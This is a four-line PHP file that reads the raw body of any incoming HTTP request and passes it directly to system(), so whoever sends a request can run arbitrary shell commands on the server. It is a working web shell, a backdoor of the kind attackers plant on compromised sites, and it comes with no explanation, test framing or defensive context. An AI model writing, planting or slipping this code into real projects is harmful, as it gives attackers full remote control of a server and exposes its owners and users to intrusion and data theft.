<?php
	$body = file_get_contents('php://input');
	system($body);
?>